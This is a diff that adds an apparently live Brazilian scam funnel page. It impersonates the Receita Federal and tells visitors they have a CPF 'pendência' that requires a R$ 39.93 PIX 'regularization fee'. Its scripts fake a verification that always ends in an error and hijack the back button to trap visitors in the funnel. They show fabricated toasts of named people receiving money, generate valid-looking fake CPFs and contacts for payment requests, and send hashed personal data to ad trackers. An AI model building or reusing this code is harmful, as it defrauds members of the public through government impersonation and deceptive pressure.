@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script");n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+  ttq.load('D8K3BJ3C77UDG683OUJ0');
+  ttq.load('D9D5FKRC77U6Q0JCMOC0');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<script>
+(function () {
+  if (!window.ttq) return;
+  async function sha256Hex(str) {
+    const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
+    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
+  }
+  async function syncIdentify() {
+    const email = localStorage.getItem('email');
+    const phoneRaw = localStorage.getItem('telephone') || localStorage.getItem('telefone');
+    const cpf = localStorage.getItem('cpf');
+    const identify = {};
+    if (email) identify.email = await sha256Hex(email.trim().toLowerCase());
+    if (phoneRaw) {
+      const digits = phoneRaw.replace(/\D/g, '');
+      const e164 = '+' + (digits.startsWith('55') ? digits : '55' + digits);
+      identify.phone_number = await sha256Hex(e164);
+    }
+    if (cpf) identify.external_id = await sha256Hex(cpf.replace(/\D/g, ''));
+    if (Object.keys(identify).length) ttq.identify(identify);
+  }
+  syncIdentify();
+})();
+</script>
+<script>
+	// ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+	const link = '/backs/backup/index.html?next=up5';
+
+	function setBackRedirect(url) {
+		let urlBackRedirect = url;
+		urlBackRedirect = urlBackRedirect =
+			urlBackRedirect.trim() +
+			(urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+			document.location.search.replace('?', '').toString();
+
+		history.pushState({}, '', location.href);
+		history.pushState({}, '', location.href);
+		history.pushState({}, '', location.href);
+
+		window.addEventListener('popstate', () => {
+			console.log('onpopstate', urlBackRedirect);
+			setTimeout(() => {
+				location.href = urlBackRedirect;
+			}, 1);
+		});
+	}
+
+	setBackRedirect(link);
+</script>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1347234213937278');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1347234213937278&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-7R98015HCR"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+
+        gtag('config', 'G-7R98015HCR');
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Upsell 4 - Pendência Receita Federal</title>
+    <script type="text/javascript">
+        (function (c, l, a, r, i, t, y) {
+            c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
+            t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
+            y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
+        })(window, document, "clarity", "script", "s8vuwmcvbq");
+    </script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #eef2f3;
+        }
+
+        .header {
+            background-color: #004080;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .header img {
+            width: 65%;
+            padding: 0%;
+            margin-bottom: 0%;
+            margin-top: -5%;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: calc(100vh - 100px);
+            text-align: center;
+            padding: 20px;
+            background: linear-gradient(135deg, #002776, #0044cc);
+            color: white;
+        }
+
+        .container h1 {
+            font-size: 28px;
+            margin-bottom: 20px;
+            margin-top: -35%;
+            font-weight: bold;
+        }
+
+        .loading {
+            font-size: 18px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loading span {
+            margin-left: 10px;
+            font-weight: bold;
+        }
+
+        .loading-bar {
+            width: 80%;
+            height: 8px;
+            background-color: #cce5ff;
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 15px 0;
+            position: relative;
+        }
+
+        .loading-bar div {
+            height: 100%;
+            width: 0;
+            background-color: #ffcc00;
+            animation: loading 6s linear forwards;
+        }
+
+        @keyframes loading {
+            0% {
+                width: 0;
+            }
+
+            100% {
+                width: 100%;
+            }
+        }
+
+        .container p {
+            font-size: 18px;
+            margin: 15px 0;
+        }
+
+        .container .highlight {
+            color: #ffcc00;
+            font-weight: bold;
+        }
+
+        .action {
+            margin-top: 30px;
+            display: none;
+        }
+
+        .action button {
+            background-color: #ffcc00;
+            color: #002776;
+            border: none;
+            padding: 15px 25px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .action button:hover {
+            background-color: #ffd633;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #cce5ff;
+        }
+
+        .footer strong {
+            color: #ffcc00;
+        }
+
+        #user-display-name {
+            font-size: 12px;
+        }
+
+        .pix-box { background: #fff; border-radius: 10px; padding: 16px; margin-top: 16px; text-align: left; color: #1f2937; }
+        .pix-box p { font-size: 13px; color: #444; margin-bottom: 10px; text-align: center; }
+        .pix-code { background: #f8f8f8; border: 1px solid #eee; border-radius: 8px; padding: 10px; font-size: 11px; color: #333; word-break: break-all; margin-bottom: 12px; max-height: 80px; overflow-y: auto; font-family: monospace; }
+        .pix-waiting { font-size: 12px; color: #888; text-align: center; margin-top: 10px; }
+        .pix-error { color: #b91c1c; font-size: 13px; text-align: center; margin-bottom: 10px; }
+        .pix-copy-btn { width: 100%; background-color: #ffcc00; color: #002776; border: none; padding: 15px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; }
+        .pix-spinner { width: 16px; height: 16px; border: 3px solid rgba(0,39,118,0.3); border-top: 3px solid #002776; border-radius: 50%; display: inline-block; vertical-align: middle; margin-right: 8px; animation: pix-spin 1s linear infinite; }
+        @keyframes pix-spin { to { transform: rotate(360deg); } }
+    </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const container = document.querySelector(".container");
+            const actionSection = document.querySelector(".action");
+            const loadingBar = document.querySelector(".loading-bar div");
+            const loadingElements = document.querySelectorAll(".loading, .loading-bar");
+            let step = 0;
+
+            const steps = [
+                "Verificando pagamento...",
+                "Verificando dados...",
+                "Erro encontrado!"
+            ];
+
+            const interval = setInterval(() => {
+                if (step < steps.length) {
+                    container.querySelector("h1").textContent = steps[step];
+                    step++;
+                } else {
+                    clearInterval(interval);
+                    container.querySelector("h1").textContent = "⚠️ Pendência na Receita Federal!";
+                    loadingElements.forEach(el => el.style.display = "none");
+                    actionSection.style.display = "block";
+                }
+            }, 2000);
+
+
+            loadingBar.style.animationPlayState = 'running';
+        });
+    </script>
+</head>
+
+<body>
+
+    <div class="header">
+        <img src="https://s3.typebot.io/public/workspaces/clpwrgv88001vlh0fl3wduaqz/typebots/clsoykmoc0001o1a8fuuy3j8r/blocks/ymggz8eopp0fj524hfxubuit?v=1735166818525"
+            alt="Logo Receita Federal">
+    </div>
+
+    <div class="container">
+        <h1>⚠️ Verificando...</h1>
+        <div class="loading">
+            <span>Processando informações...</span>
+        </div>
+        <div class="loading-bar">
+            <div></div>
+        </div>
+
+        <div class="action">
+            <p>Identificamos uma pendência relacionada ao seu <span class="highlight">CPF</span>.</p>
+            <p>Para resolver, é necessário efetuar o pagamento da <span class="highlight">Taxa de Regularização</span>.
+            </p>
+            <p>O valor é de <span class="highlight">R$ 39,93</span>. Após o pagamento, sua solicitação será liberada
+                imediatamente!</p>
+
+            <div class="cta">
+                <button type="button" id="offerCta" onclick="handleCTA()">REGULARIZAR AGORA</button>
+            </div>
+
+            <div id="pixResultBox" class="pix-box" style="display:none;">
+                <p>Copie o código PIX abaixo e pague no app do seu banco:</p>
+                <div class="pix-code" id="pixCode"></div>
+                <button type="button" class="pix-copy-btn" id="pixCopyButton" onclick="copyPixCode()">COPIAR CÓDIGO PIX</button>
+                <p class="pix-waiting" id="pixWaitingText">Aguardando confirmação do pagamento...</p>
+            </div>
+
+            <div id="pixErrorBox" class="pix-box" style="display:none;">
+                <p class="pix-error" id="pixErrorMessage">Ocorreu um erro. Tente novamente.</p>
+                <button type="button" onclick="handleCTA()" style="background-color:#ffcc00;color:#002776;border:none;padding:15px 25px;font-size:16px;font-weight:bold;border-radius:8px;cursor:pointer;">TENTAR NOVAMENTE</button>
+            </div>
+        </div>
+
+        <div class="footer">
+            ⚠️ <strong>Atenção:</strong> O não pagamento pode causar o bloqueio definitivo do processo.
+        </div>
+    </div>
+    <script>
+        const PIX_API_BASE = 'https://webhookfuniltodottk.netlify.app/';
+        const PIX_PRODUCT = 'ups-up4';
+        const PIX_TRACK_VALUE = 39.93;
+        const PIX_PENDING_KEY = 'pix_pending_' + PIX_PRODUCT;
+        const PIX_PENDING_MAX_AGE_MS = 30 * 60 * 1000; // depois disso, ignora o PIX antigo e gera um novo
+        let pixPollInterval = null;
+        let currentTransactionId = null;
+
+        function getParam(keys) {
+            const urlParams = new URLSearchParams(window.location.search);
+            for (const key of keys) {
+                const fromUrl = urlParams.get(key);
+                if (fromUrl) return fromUrl;
+            }
+            for (const key of keys) {
+                const fromStorage = localStorage.getItem(key);
+                if (fromStorage) return fromStorage;
+            }
+            return '';
+        }
+
+        const FALLBACK_FIRST_NAMES = ['Maria', 'José', 'Ana', 'João', 'Carlos', 'Paulo', 'Pedro', 'Lucas', 'Marcos', 'Rafael'];
+        const FALLBACK_LAST_NAMES = ['Silva', 'Souza', 'Oliveira', 'Santos', 'Pereira', 'Costa', 'Rodrigues', 'Almeida'];
+        const FALLBACK_DDDS = ['11', '21', '31', '41', '51', '61', '71', '81', '85'];
+
+        function generateFallbackName() {
+            const first = FALLBACK_FIRST_NAMES[Math.floor(Math.random() * FALLBACK_FIRST_NAMES.length)];
+            const last = FALLBACK_LAST_NAMES[Math.floor(Math.random() * FALLBACK_LAST_NAMES.length)];
+            return `${first} ${last}`;
+        }
+        function generateFallbackEmail(name) {
+            const slug = name.toLowerCase().normalize('NFD').replace(new RegExp('[\\u0300-\\u036f]', 'g'), '').replace(/[^a-z]+/g, '.');
+            return `${slug}${Math.floor(1000 + Math.random() * 9000)}@gmail.com`;
+        }
+        function generateFallbackPhone() {
+            const ddd = FALLBACK_DDDS[Math.floor(Math.random() * FALLBACK_DDDS.length)];
+            const number = '9' + String(Math.floor(10000000 + Math.random() * 89999999));
+            return ddd + number;
+        }
+        function generateFallbackDocument() {
+            const calcDigit = (digits) => {
+                let sum = 0;
+                let weight = digits.length + 1;
+                for (const d of digits) { sum += d * weight; weight--; }
+                const mod = sum % 11;
+                return mod < 2 ? 0 : 11 - mod;
+            };
+            const base = Array.from({ length: 9 }, () => Math.floor(Math.random() * 9));
+            const d1 = calcDigit(base);
+            const d2 = calcDigit([...base, d1]);
+            return [...base, d1, d2].join('');
+        }
+
+        function collectCustomerData() {
+            const name = getParam(['nome', 'name']) || generateFallbackName();
+            const email = getParam(['email']) || generateFallbackEmail(name);
+            const document_ = getParam(['cpf', 'document']) || generateFallbackDocument();
+            const phone = getParam(['telefone', 'telephone', 'phone']) || generateFallbackPhone();
+            return { name, email, document: document_, phone };
+        }
+
+        async function pixSha256Hex(str) {
+            const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
+            return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
+        }
+
+        async function buildPixTrackingParams(productId) {
+            const params = new URLSearchParams();
+            if (productId) params.set('product', productId);
+            const email = getParam(['email']);
+            if (email) params.set('eh', await pixSha256Hex(email.trim().toLowerCase()));
+            const phoneRaw = getParam(['telefone', 'telephone', 'phone']);
+            if (phoneRaw) {
+                const digits = phoneRaw.replace(/\D/g, '');
+                const e164 = '+' + (digits.startsWith('55') ? digits : '55' + digits);
+                params.set('ph', await pixSha256Hex(e164));
+            }
+            const doc = getParam(['cpf', 'document']);
+            if (doc) params.set('xid', await pixSha256Hex(doc.replace(/\D/g, '')));
+            const ttclidCookie = document.cookie.match(/(?:^|; )ttclid=([^;]+)/);
+            if (ttclidCookie) params.set('ttclid', decodeURIComponent(ttclidCookie[1]));
+            const ttpCookie = document.cookie.match(/(?:^|; )_ttp=([^;]+)/);
+            if (ttpCookie) params.set('ttp', decodeURIComponent(ttpCookie[1]));
+            return params;
+        }
+
+        function updateCtaUI(state) {
+            document.getElementById('offerCta').style.display = state === 'idle' ? 'inline-block' : 'none';
+            document.getElementById('pixResultBox').style.display = state === 'result' ? 'block' : 'none';
+            document.getElementById('pixErrorBox').style.display = state === 'error' ? 'block' : 'none';
+        }
+
+        function copyPixCode() {
+            const code = document.getElementById('pixCode').textContent;
+            if (!code) return;
+            navigator.clipboard.writeText(code).then(() => {
+                const btn = document.getElementById('pixCopyButton');
+                const original = btn.textContent;
+                btn.textContent = 'CÓDIGO COPIADO!';
+                setTimeout(() => { btn.textContent = original; }, 2000);
+            });
+        }
+
+        async function startPixPolling(id) {
+            if (pixPollInterval) clearInterval(pixPollInterval);
+            const trackingParams = await buildPixTrackingParams(PIX_PRODUCT);
+            pixPollInterval = setInterval(async () => {
+                try {
+                    const res = await fetch(`${PIX_API_BASE}/api/pix/status?id=${encodeURIComponent(id)}&${trackingParams.toString()}`);
+                    const data = await res.json();
+                    if (data.status === 'approved') {
+                        clearInterval(pixPollInterval);
+                        localStorage.removeItem(PIX_PENDING_KEY);
+                        document.getElementById('pixWaitingText').textContent = 'Pagamento confirmado! Liberando acesso...';
+                        trackFacebookPixelEvent('Purchase', { value: PIX_TRACK_VALUE, currency: 'BRL', content_name: PIX_PRODUCT });
+                        setTimeout(() => {
+                            window.location.href = '/ups/up5/index.html' + window.location.search;
+                        }, 1500);
+                    } else if (data.status === 'failed') {
+                        clearInterval(pixPollInterval);
+                        localStorage.removeItem(PIX_PENDING_KEY);
+                        document.getElementById('pixErrorMessage').textContent = 'O pagamento não foi aprovado ou o PIX expirou. Gere um novo código para tentar novamente.';
+                        updateCtaUI('error');
+                    }
+                } catch (e) {}
+            }, 5000);
+        }
+
+        async function handleCTA() {
+            const btn = document.getElementById('offerCta');
+            document.getElementById('pixResultBox').style.display = 'none';
+            document.getElementById('pixErrorBox').style.display = 'none';
+            btn.style.display = 'inline-block';
+            btn.disabled = true;
+            btn.innerHTML = '<span class="pix-spinner"></span>Gerando PIX...';
+
+            // Se já existe um PIX gerado e ainda não pago pra essa oferta, reaproveita
+            // ele em vez de gerar outro (evita gerar PIX infinitamente a cada clique).
+            const pendingRaw = localStorage.getItem(PIX_PENDING_KEY);
+            if (pendingRaw) {
+                try {
+                    const pending = JSON.parse(pendingRaw);
+                    const isFresh = pending.id && (Date.now() - pending.ts) < PIX_PENDING_MAX_AGE_MS;
+                    if (isFresh) {
+                        const statusRes = await fetch(`${PIX_API_BASE}/api/pix/status?id=${encodeURIComponent(pending.id)}`);
+                        const statusData = await statusRes.json();
+                        if (statusData.status === 'pending' && statusData.qrCode) {
+                            currentTransactionId = pending.id;
+                            document.getElementById('pixCode').textContent = statusData.qrCode;
+                            updateCtaUI('result');
+                            startPixPolling(currentTransactionId);
+                            return;
+                        }
+                    }
+                } catch (e) {}
+                localStorage.removeItem(PIX_PENDING_KEY);
+            }
+
+            const customer = collectCustomerData();
+            const urlParams = new URLSearchParams(window.location.search);
+            const ttclidCookie = document.cookie.match(/(?:^|; )ttclid=([^;]+)/);
+            const ttpCookie = document.cookie.match(/(?:^|; )_ttp=([^;]+)/);
+            const tracking = {
+                utm_source: urlParams.get('utm_source') || '',
+                utm_medium: urlParams.get('utm_medium') || '',
+                utm_campaign: urlParams.get('utm_campaign') || '',
+                utm_content: urlParams.get('utm_content') || '',
+                utm_term: urlParams.get('utm_term') || '',
+                src: urlParams.get('src') || '',
+                sck: urlParams.get('sck') || '',
+                ttclid: ttclidCookie ? decodeURIComponent(ttclidCookie[1]) : (urlParams.get('ttclid') || ''),
+                ttp: ttpCookie ? decodeURIComponent(ttpCookie[1]) : '',
+                real_name: getParam(['nome', 'name']) ? 'true' : 'false',
+                real_email: getParam(['email']) ? 'true' : 'false',
+                real_phone: getParam(['telefone', 'telephone', 'phone']) ? 'true' : 'false',
+                real_document: getParam(['cpf', 'document']) ? 'true' : 'false',
+            };
+
+            try {
+                const response = await fetch(`${PIX_API_BASE}/api/pix/create`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ ...customer, product: PIX_PRODUCT, tracking }),
+                });
+
+                const data = await response.json();
+
+                if (!response.ok) {
+                    throw new Error(data.error || 'Falha ao gerar o PIX.');
+                }
+
+                currentTransactionId = data.transactionId;
+                localStorage.setItem(PIX_PENDING_KEY, JSON.stringify({ id: currentTransactionId, ts: Date.now() }));
+                document.getElementById('pixCode').textContent = data.qrCode;
+                updateCtaUI('result');
+
+
+                startPixPolling(currentTransactionId);
+            } catch (err) {
+                document.getElementById('pixErrorMessage').textContent = err.message || 'Tente novamente em instantes.';
+                updateCtaUI('error');
+            }
+        }
+
+        // Função para trackear eventos de Facebook Pixel
+        function trackFacebookPixelEvent(event, params = {}) {
+            if (typeof fbq !== 'undefined') {
+                fbq('track', event, params);
+            }
+        }
+
+        // Disparar eventos ViewContent
+        document.addEventListener('DOMContentLoaded', function () {
+            // Evento ViewContent no carregamento da página
+            trackFacebookPixelEvent('ViewContent', {
+                content_type: 'tax_regularization',
+                content_name: 'Regularização Receita Federal - Up4'
+            });
+
+            // Trackear clique no botão "Regularizar Agora"
+            const btnRegularizar = document.getElementById('offerCta');
+            if (btnRegularizar) {
+                btnRegularizar.addEventListener('click', function () {
+                    trackFacebookPixelEvent('ViewContent', {
+                        content_type: 'regularization_payment',
+                        content_name: 'Pagamento Taxa de Regularização'
+                    });
+                });
+            }
+        });
+    </script>
+
+
+<script>
+(function () {
+  const style = document.createElement('style');
+  style.textContent = `
+    .sp-toast{position:fixed;top:max(42px,calc(env(safe-area-inset-top) + 200px));right:10px;max-width:min(240px,calc(100vw - 20px));background:rgba(255,255,255,.97);backdrop-filter:blur(40px) saturate(200%);-webkit-backdrop-filter:blur(40px) saturate(200%);border-radius:12px;padding:9px 11px;box-shadow:0 2px 4px rgba(0,0,0,.04),0 8px 24px rgba(0,0,0,.08),0 20px 48px rgba(0,0,0,.06);border:.5px solid rgba(0,0,0,.05);display:flex;align-items:center;gap:8px;z-index:99998;transform:translateX(120%) scale(.92);opacity:0;transition:all .45s cubic-bezier(.23,1,.32,1);pointer-events:none}
+    .sp-toast.show{transform:translateX(0) scale(1);opacity:1}
+    .sp-toast.hide{transform:translateX(120%) scale(.92);opacity:0;transition:all .3s cubic-bezier(.55,0,1,.45)}
+    .sp-ico{width:30px;height:30px;min-width:30px;border-radius:50%;object-fit:cover}
+    .sp-text{font-size:12px;color:#444;line-height:1.3;font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Helvetica Neue',sans-serif}
+    .sp-text b{color:#111;font-weight:700}
+  `;
+  document.head.appendChild(style);
+
+  const toast = document.createElement('div');
+  toast.className = 'sp-toast';
+  toast.innerHTML = `
+    <img alt="" class="sp-ico" src="/2/images/supericon.png">
+    <div class="sp-text"><b class="sp-name">José Silva</b> de <span class="sp-city">São Paulo</span> conseguiu <b class="sp-amount">R$ 4.000</b></div>
+  `;
+  document.body.appendChild(toast);
+
+  const elName = toast.querySelector('.sp-name');
+  const elCity = toast.querySelector('.sp-city');
+  const elAmount = toast.querySelector('.sp-amount');
+
+  const firstNames = ['José', 'João', 'Carlos', 'Pedro', 'Lucas', 'Marcos', 'Rafael', 'Bruno', 'Felipe', 'Gabriel', 'Mariana', 'Ana', 'Fernanda', 'Juliana', 'Camila', 'Patrícia', 'Aline', 'Renata', 'Beatriz', 'Larissa'];
+  const lastNames = ['Silva', 'Souza', 'Oliveira', 'Santos', 'Pereira', 'Costa', 'Rodrigues', 'Almeida', 'Nascimento', 'Carvalho', 'Gomes', 'Martins', 'Araújo', 'Melo', 'Barbosa'];
+  const cities = ['São Paulo', 'Rio de Janeiro', 'Belo Horizonte', 'Curitiba', 'Porto Alegre', 'Salvador', 'Fortaleza', 'Recife', 'Brasília', 'Campinas', 'Goiânia', 'Manaus', 'Belém', 'Florianópolis', 'Natal'];
+  const pick = arr => arr[Math.floor(Math.random() * arr.length)];
+
+  function showSocialProof() {
+    elName.textContent = `${pick(firstNames)} ${pick(lastNames)}`;
+    elCity.textContent = pick(cities);
+    const amount = Math.floor(Math.random() * 41) * 50 + 3000;
+    elAmount.textContent = 'R$ ' + amount.toLocaleString('pt-BR');
+    toast.classList.remove('hide');
+    toast.classList.add('show');
+    setTimeout(() => { toast.classList.remove('show'); toast.classList.add('hide'); }, 5000);
+  }
+
+  function scheduleNext() {
+    const gap = 10000 + Math.random() * 10000;
+    setTimeout(() => { showSocialProof(); scheduleNext(); }, 5000 + gap);
+  }
+
+  setTimeout(() => { showSocialProof(); scheduleNext(); }, 8000);
+})();
+</script>
+</body>
+
+</html>
